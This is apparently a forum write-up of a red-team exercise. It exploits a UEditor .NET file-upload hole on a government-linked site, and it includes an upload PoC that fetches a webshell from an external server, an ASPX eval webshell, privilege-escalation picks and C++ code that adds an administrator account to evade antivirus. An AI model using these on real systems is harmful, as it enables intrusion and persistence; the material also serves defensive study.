### 本篇文章纯属虚构，如有类同实属巧合

0×01简述
------

对这段时间做的一次攻防演练做一个记录，这次给我们分了三个目标，一个目标是甲方单位自己的一个自建系统，其余两个是甲方的下级单位的系统。开始之前觉得不好做，因为攻防演练跟HW有些差别，HW可以不限制攻击手法，可以从上游供应链，社工、钓鱼多种角度出发来挖掘漏洞。这次攻防演练给我们三个目标、两个web系统、一个app，可以利用的点非常少，不可以攻击其他的系统，只能搞这几个目标，要不是这次运气好真的就拉垮了。

0×02开局一个登陆框
-----------

开局就是一个登陆框，开整

遇到登陆可以做的渗透路径大概就是

- 爆破弱口令----爆破的传统思路都是固定账号爆破密码，还有一种姿势是固定密码爆破用户名。比如使用固定密码123456，爆破常用用户名或者常用人名拼音。
- 扫目录-----目录扫描是一个存在惊喜的地方，说不定能扫描到后台未授权访问的链接、备份文件、编辑器、敏感信息等。
- 框架漏洞-----如果能够发现网站使用的某种CMS，例如thinkphp就直接通过已有的漏洞来攻击
- 源码查看-----右键查看JS源码，你可能会发现被注释的账号密码、接口、token、真实IP、开发环境等可以利用的信息。

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-a4ac0c33d5ac5d85c05f4730eab70bfcb5841bab.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-a4ac0c33d5ac5d85c05f4730eab70bfcb5841bab.png)

使用ip138查询了这个域名的ip

放到fofa里面查到四个开放的端口

ip="192.168.1.1"

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-6a4b49673fc1f6ee93bc2f5611d31171d7ef5445.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-6a4b49673fc1f6ee93bc2f5611d31171d7ef5445.png)

正常访问的端口只有两个，一个是443就是这个登陆框页面的端口，一个80端口是一个404页面

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-c06996c11f83343692e7f5ed1f531c100ab0c42d.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-c06996c11f83343692e7f5ed1f531c100ab0c42d.png)

其他信息没啥收集的了，目标不能打偏所以就不看C段了

常规的开始扫一下目录吧

dog警告

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-82789a3baa2bfb01310e610560d753890a3ac131.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-82789a3baa2bfb01310e610560d753890a3ac131.png)

用延时扫描目录

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-239ac71e5ee4e3470209a2bf977cfb111853c623.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-239ac71e5ee4e3470209a2bf977cfb111853c623.png)

扫了一晚上啥也没扫到，还有一个80端口的404还没扫用dirsearch开扫

糟糕直接把IP给ban了

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-463e37027e14ca4bcac9a6d51f974cd5fff988af.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-463e37027e14ca4bcac9a6d51f974cd5fff988af.png)

继续用延时扫描还是没扫出来东西。

放到云溪里面查一下能不能找到这个系统的框架

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-33413f11e3db7d226c334d0501e5df8413db2ddb.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-33413f11e3db7d226c334d0501e5df8413db2ddb.png)

查了个寂寞

看一下源码js文件

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-72d6e0dbed3993a4d654f9e5fd0f5e129b953611.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-72d6e0dbed3993a4d654f9e5fd0f5e129b953611.png)

空空如也

最后只剩下一招爆破弱口令 幸好没有验证码

由于网站部署的有安全狗 所以我们爆破的时候线程调低到线程1就好

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-6223983bd131e98f9d603a2da3a992535b73dc84.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-6223983bd131e98f9d603a2da3a992535b73dc84.png)

返回登陆框随便输入一个账号密码，回显的是账号或密码有误，请重新输入！ 所以我们无法通过输入回显来得到账号信息

只能用超级大字典来爆破了，

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-18395bfde059e1d8a551ce99677e4b131d9a2696.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-18395bfde059e1d8a551ce99677e4b131d9a2696.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ef11bd2ee4f550df7363172ab112d8ea99688f9b.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ef11bd2ee4f550df7363172ab112d8ea99688f9b.png)

通过全国姓名拼音加账号top100加密码top1000没有爆破出来（最后才知道账号是手机号）

0×03山重水复疑无路
-----------

忽然想起来这个单位还有一个APP，立马下载APP放到mumu模拟器打开

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-f2a1894cbd0b3884db67bfc4cf07a3f43fd38499.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-f2a1894cbd0b3884db67bfc4cf07a3f43fd38499.png)

登录页面跟web的不能说很像，简直就是一模一样

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-e5a66e0dd262513d2e5b9fb5cad458ddeb613ece.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-e5a66e0dd262513d2e5b9fb5cad458ddeb613ece.png)

登陆框这里是没有办法下手了 看看其他的功能

burp和模拟器设置一下代理

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-5aeb1c14df31f2db986cb88a4e9b6ff591be9432.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-5aeb1c14df31f2db986cb88a4e9b6ff591be9432.png)

打开burp点击app的一些页面，查看返回包的时候忽然发现了`ueditor`这简直绝了 为啥当时目录扫描没扫到。

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-0fe823df5b5147a2007b9490ce062409d233090c.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-0fe823df5b5147a2007b9490ce062409d233090c.png)

山穷水复疑无路，柳暗花明又一村。

居然看见了`ueditor`编辑器。

### 漏洞描述

`这个编辑器是百度开发的一款编辑器，目前已经不对其进行后续开发和更新，存在多个漏洞（文件上传，xss,ssrf）文件上传漏洞只存在于该编辑器的.net版本。其他的php,jsp,asp版本不受此UEditor的漏洞的影响，.net存在任意文件上传，绕过文件格式的限制，在获取远程资源的时候并没有对远程文件的格式进行严格的过滤与判断。`

### 影响范围

`该漏洞影响UEditor的.Net版本，其它语言版本暂时未受影响。`

### 漏洞检测

我们可以看下XRAY的poc

```yaml
name: poc-yaml-ueditor-cnvd-2017-20077-file-upload
rules:
  - method: GET
    path: /ueditor/net/controller.ashx?action=catchimage&encode=utf-8
    headers:
      Accept-Encoding: 'deflate'
    follow_redirects: false
    expression: |
      response.status == 200 && response.body.bcontains(bytes(string("没有指定抓取源")))
detail:
  author: 清风明月(www.secbook.info)
  influence_version: 'UEditor v1.4.3.3'
  links:
    - https://zhuanlan.zhihu.com/p/85265552
    - https://www.freebuf.com/vuls/181814.html
  exploit: >-
    http://localhost/ueditor/net/controller.ashx?action=catchimage&encode=utf-8
```

使用GET方式请求了路径`/ueditor/net/controller.ashx?action=catchimage&encode=utf-8`如果响应里面存在`没有指定抓取源`就证明存在漏洞。

拼接一下我们的网站尝试一下

www.xxx.com/ueditor/net/controller.ashx?action=catchimage&amp;encode=utf-8

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-b4e33d69778942a6e6c7765a1d88286032485c15.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-b4e33d69778942a6e6c7765a1d88286032485c15.png)

非常完美

漏洞利用

1、我们可以利用post方法直接上传文件到目标网站

**Poc：**

```html
<form action="http://www.xxx.com/ueditor/net/controller.ashx?action=catchimage" enctype="multipart/form-data" method="POST">

 <p>shell addr: <input type="text" name="source[]" /></p>

 <input type="submit" value="Submit" />

</form>
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-3ebe9914f2a6b754fd871a5211c0b0767d74dd3a.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-3ebe9914f2a6b754fd871a5211c0b0767d74dd3a.png)

在利用这个POC的时候，需要一个外网服务器，上传脚本文件，其中【shell addr】后填写的就是服务器上脚本的地址加上后缀（?.aspx）。

制作一个图片马放到外网服务器上面

`copy 1.jpg/b +2.aspx 3.jpg`

一句话脚本

`<%@ Page Language="Jscript"%><%eval(Request.Item["zhanan"],"unsafe");%>`

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-03590046a356105c1fd2f442cb4c69a5d94c8c94.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-03590046a356105c1fd2f442cb4c69a5d94c8c94.png)

把脚本文件放到服务器上面

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-9e7b70f44d2ac20862dd9745ea6b645be61a0fca.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-9e7b70f44d2ac20862dd9745ea6b645be61a0fca.png)

脚本地址：[http://服务器地址/3.jpg](http://xn--zfru1gfr6bz63i/3.jpg)

poc里面shell addr填http://服务器地址/3.jpg?.aspx

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-026de2b2dfd0569d9db468894bb88ac6171c870c.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-026de2b2dfd0569d9db468894bb88ac6171c870c.png)

然后点击submit上传

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-b963c58184b57586ec62e59ee094c15c28154955.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-b963c58184b57586ec62e59ee094c15c28154955.png)

上传成功 并得到脚本路径

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-69e2c627b2ff7ea31cfe34b217e834f2af63604c.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-69e2c627b2ff7ea31cfe34b217e834f2af63604c.png)

0×04提权
------

成功getshell之后 我们下一步就是提权了 使用`whoami`查看系统权限

`iis apppool\47middleschool`权限

使用`tasklist /svc`查看系统有没有安装杀毒软件（可以看到安装了安全狗，之前扫目录的时候已经看到了）

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-5f9d5c27aad13cdcf85bb8273d57c41ece3f9dc6.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-5f9d5c27aad13cdcf85bb8273d57c41ece3f9dc6.png)

使用`systeminfo`查看系统版本信息和补丁情况（服务器是2008R2版本）

补丁情况可以使用在线网站来查询

[补丁查询网址](https://www.shentoushi.top/av/kb.php)

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-63aad8fa4b3ca8fd7784d228e51fb4f617993cf7.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-63aad8fa4b3ca8fd7784d228e51fb4f617993cf7.png)

复制补丁然后粘贴到框里面就可以查看改系统可以使用的脚本了

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-8f929fa8b1de2e6406b54c7f89511716e2193827.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-8f929fa8b1de2e6406b54c7f89511716e2193827.png)

我们是win2008系统 可以看到我们可以使用的脚本如下

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-68d4684473cc2aa4c7d661af571f524e82629613.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-68d4684473cc2aa4c7d661af571f524e82629613.png)

```php
windows2008 可用脚本:
KB3124280 : MS16-016
KB3134228 : MS16-014
KB3079904 : MS15-097
KB3077657 : MS15-077
KB3045171 : MS15-051
KB3000061 : MS14-058
KB2829361 : MS13-046
KB2850851 : MS13-053 EPATHOBJ 0day 限32位
KB2707511 : MS12-042 sysret -pid
KB2124261 : KB2271195 MS10-065 IIS7
KB970483 : MS09-020 IIS6
```

由于该系统在正常运行，所以我们不能影响系统的正常使用，这些提权脚本有的是溢出漏洞，可能会导致系统的崩溃或者蓝屏，所以我们需要在本地安装win2008系统来测试这些脚本的使用，是否可以正常使用。

在本地起一个win2008虚拟机系统并创建一个低权限的账号

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ecfdd1f011a5b93d3a68253bab899b66b4dca2fc.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ecfdd1f011a5b93d3a68253bab899b66b4dca2fc.png)

查找我们可以使用的脚本来进行利用尝试

使用MS16-014下载使用

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-6030c8066d10e6ff1ff8bb336122692f9c0f26d8.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-6030c8066d10e6ff1ff8bb336122692f9c0f26d8.png)

打开使用

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-d8701c0db5c573a2c2764c8ccbd6c3bbc5d112bf.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-d8701c0db5c573a2c2764c8ccbd6c3bbc5d112bf.png)

宕机蓝屏

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-37df0ebf8e66693796c7e95c166d85c28ce6225c.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-37df0ebf8e66693796c7e95c166d85c28ce6225c.png)

所以说我们盲目的去使用一些可能会导致系统崩溃的脚本来尝试正常的业务环境，如果导致客户的业务崩溃，可能会造成一些无法挽回的损失。

最后使用`ms15-051`提权成功。`system`权限

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-8104f63c2413f1bcb20eb5cd8232a7d271478b11.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-8104f63c2413f1bcb20eb5cd8232a7d271478b11.png)

使用`system`权限添加管理员账号时被狗狗拦截了

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-62d27d75118c69b22ea242e0dfdb6b350646540b.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-62d27d75118c69b22ea242e0dfdb6b350646540b.png)

最后请教了一些大佬，大佬们说可以使用Windows api函数添加管理员账户，去百度学习了一番

我们在渗透测试过程中需要添加管理员账号是通常是通过CMD调用net命令，然而一些杀软会限制CMD的一些命令，我们就可以使用windows自带的api函数来执行这些操作，从而绕过一些杀软的限制。（很老的方法了，很多的杀软都开始限制api的一些高危操作了）

代码原理：

`使用NetUserAdd添加普通权限的用户，NetLocalGroupAddMembers添加管理员权限。`

代码如下:

```c++
#ifndef UNICODE    
#define UNICODE    
#endif    
#include  <stdio.h>  
#include  <windows.h>  
#include  <lm.h>  
#include <iostream>
#pragma comment(lib,"netapi32")    
int Usage(wchar_t*);
int wmain(int argc, wchar_t* argv[])
{
    // 定义USER_INFO_1结构体
    USER_INFO_1 ui;
    DWORD dwError = 0;
    ui.usri1_name = L"test";            // 账户    
    ui.usri1_password = L"Test@qq.com";      // 密码
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT;
    ui.usri1_script_path = NULL;
    //添加名为test的用户,密码为Test@qq.com    
    if (NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError) == NERR_Success)
    {
        std::cout << "[+]        Add Success!!!  \n";
        std::cout << "[+]        UserName:Bypass360  PassWord:Success@qq.com\n";
    }
    else
    {
        //添加失败    
        std::cout << "[+]        Add User Error!\n";
    }

    // 添加用户到administrators组
    LOCALGROUP_MEMBERS_INFO_3 account;
    account.lgrmi3_domainandname = ui.usri1_name;
    if (NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1) == NERR_Success)
    {
        //添加成功    
        std::cout << "[+]        Add to Administrators Success\n";
    }
    else
    {
        //添加失败    
        std::cout << "[+]        Add to Administrators Error!\n";
    }
    return 0;
}
```

可通过vs编译成exe文件

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-f36409f00c0158794e0892c968ae4e6b3353a596.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-f36409f00c0158794e0892c968ae4e6b3353a596.png)

简单实验：在开启Defender和火绒的情况下没有拦截

可以看到`system`权限如果通过CMD添加账号会被火绒拦截

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-1b912463fe27229418ce9dec90bf94ea203d4766.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-1b912463fe27229418ce9dec90bf94ea203d4766.png)

如果使用api添加账号并赋予超级管理员权限（可以看到结果火绒和windows防火墙没有进行拦截 成功添加超级管理员账号）

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-53663577c9e4044f5512ed7e0c388635461a1ef1.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-53663577c9e4044f5512ed7e0c388635461a1ef1.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-3381c130569a8c1bf6671eeb00c86134bd22415e.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-3381c130569a8c1bf6671eeb00c86134bd22415e.png)

通过shell把我们的exe文件上传 并通过`ms15-051`的`system`权限来运行

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-4cc821deab57a1ad1e8589d75edcb00cd7aa0511.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-4cc821deab57a1ad1e8589d75edcb00cd7aa0511.png)

但是废了这么大劲居然没有反应。

本地起一个环境来看一下是哪里出问题了，安装一个安全狗。

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-9f4ec6078eea6ed5e39c79332d86316a5a8d1904.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-9f4ec6078eea6ed5e39c79332d86316a5a8d1904.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-a5b42ca65f6cb40a6937fd80aa6a71754086550f.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-a5b42ca65f6cb40a6937fd80aa6a71754086550f.png)

这是啥情况，我本地安全狗没有拦截啊，猜想可能是系统做了某种限制。此路不通。

最后拿到服务器是通过下载网站备份文件，然后翻网站配置文件找到了数据库密码。

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-d63eb3dc3ae02d239d2a4f604a7307ca57e95138.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-d63eb3dc3ae02d239d2a4f604a7307ca57e95138.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ccbf6899d46e1618873f2ff72348f297be9844ba.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-ccbf6899d46e1618873f2ff72348f297be9844ba.jpg)

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-8cfa88e81df2243a95b8c3b28fdb80439c299dc4.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-8cfa88e81df2243a95b8c3b28fdb80439c299dc4.png)

盲猜一波这个密码就是服务器密码。成功登陆。（耐心和细心）

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-a3c25b0f39e55dcef660b943ad248fa9f13a6489.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-a3c25b0f39e55dcef660b943ad248fa9f13a6489.png)

最后也是很幸运的完成了这次演练，也拿到了大量的敏感信息，相信甲方应该会满意吧。

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-636b5a780ceac811256d1f5dbe18a5a0f15181e6.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-636b5a780ceac811256d1f5dbe18a5a0f15181e6.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-c1730da81c2fb023764489f1e1438a6b9427a14d.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-c1730da81c2fb023764489f1e1438a6b9427a14d.png)

0×05总结
------

其实有时候很多系统都是`马奇诺防线`这种看似很强，但是你只要找到一个点从而利用就轻而易举的绕过或者突破他，渗透测试过程中的细心的耐心也是必不可少的要素之一，最后希望朋友们可以对文章中的不足提出建议请多多指教！